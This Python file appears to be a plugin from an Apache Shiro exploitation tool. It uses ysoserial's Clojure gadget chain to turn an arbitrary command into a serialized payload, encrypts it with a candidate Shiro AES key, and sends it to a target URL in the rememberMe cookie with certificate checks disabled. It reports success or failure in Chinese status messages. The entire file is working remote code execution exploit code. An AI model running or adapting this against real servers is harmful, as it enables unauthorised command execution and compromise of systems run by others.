# -*- coding: utf-8 -*-
# By 斯文beast  svenbeast.com

import os
import re
import base64
import uuid
import subprocess
import requests
import sys
import threadpool
from Crypto.Cipher import AES
from ..main import Idea
requests.packages.urllib3.disable_warnings()

JAR_FILE = 'moule/ysoserial.jar'

@Idea.plugin_register('Class15:Clojure')
class Clojure(object):
    def process(self,url,command,resKey,func):
        self.sendPayload(url,command,resKey)


    def sendPayload(self,url,command,resKey,fp=JAR_FILE):
        key = resKey
        target = url
        if not os.path.exists(fp):
            raise Exception('jar file not found!')
        popen = subprocess.Popen(['java', '-jar', fp, 'Clojure', command],       #popen
                                    stdout=subprocess.PIPE)
        BS = AES.block_size
        pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
        mode = AES.MODE_CBC
        iv = uuid.uuid4().bytes
        encryptor = AES.new(base64.b64decode(key), mode, iv)   #受key影响的encryptor
        file_body = pad(popen.stdout.read())         #受popen影响的file_body
        payload = base64.b64encode(iv + encryptor.encrypt(file_body))
        header={
            'User-agent' : 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:22.0) Gecko/20100101 Firefox/22.0;'
            }
        try:
            r = requests.get(target,  headers=header, cookies={'rememberMe': payload.decode()+"="},verify=False, timeout=20)  # 发送验证请求1
            #print("payload1已完成,字段rememberMe:看需要自己到源代码print "+payload.decode())
            if(r.status_code==200):
 
                print("[+]   ****Clojure模块   key: {} 已成功发送！  状态码:{}".format(str(key),str(r.status_code)))
            else:
                print("[-]   ****Clojure模块   key: {} 发送异常！    状态码:{}".format(str(key),str(r.status_code)))
        except Exception as e:
            print(e)
            return False


